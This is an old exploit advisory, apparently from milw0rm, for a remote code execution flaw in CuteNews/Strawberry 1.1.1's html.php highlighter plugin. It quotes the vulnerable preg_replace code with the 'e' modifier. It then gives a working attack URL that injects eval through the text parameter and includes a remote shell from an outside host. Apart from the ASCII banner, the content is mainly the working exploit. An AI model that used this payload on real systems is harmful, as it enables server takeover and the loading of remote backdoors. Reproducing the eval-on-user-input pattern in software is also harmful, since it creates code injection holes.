<html><head><title>CuteNews 1.1.1 (html.php) Remote Code Execution Vulnerability</title></head><pre>----[ CuteNews Remote Code Execution ... ITDefence.ru Antichat.ru ]

							Strawberry (CuteNews) Remote Code Execution
							Eugene Minaev underwater@itdefence.ru
				___________________________________________________________________
			____/  __ __ _______________________ _______  _______________    \  \   \
			/ .\  /  /_// //              /        \       \/      __       \   /__/   /
			/ /     /_//              /\        /       /      /         /     /___/
			\/        /              / /       /       /\     /         /         /
			/        /               \/       /       / /    /         /__       //\
			\       /    ____________/       /        \/    __________// /__    // /   
			/\\      \_______/        \________________/____/  2007    /_//_/   // //\
			\ \\                                                               // // /
			.\ \\        -[     ITDEFENCE.ru Security advisory     ]-         // // / . 
			. \_\\________[________________________________________]_________//_//_/ . .
			
		Preg_replace with 'e' modifier allows code execution
		&lt;?php

		$source = htmlspecialchars($text);

		$source = preg_replace(
		'/&amp;lt;!--(.*?)--&amp;gt;/es',
		'&quot;&lt;span style=\&quot;color: &quot;.$options[&quot;color&quot;][&quot;comment&quot;].&quot;;\&quot;&gt;&amp;lt;!--&quot;.
		str_replace(&quot;&amp;lt;&quot;,&quot;&amp;lt;&lt;!-- --&gt;&quot;,
		str_replace(&quot;=&quot;,&quot;=&lt;!-- --&gt;&quot;,
		&quot;$1&quot;)).
		&quot;--&amp;gt;&lt;/span&gt;&quot;',
		$source);  

		?&gt;
		
		strawberry/plugins/wacko/highlight/html.php?text=%3C!--{${eval($s)}}--%3E&amp;s=include('blackybr.nm.ru/shell');
		

----[ FROM RUSSIA WITH LOVE :: underWHAT?! , gemaglabin ]

# milw0rm.com [2008-01-06]</pre></html>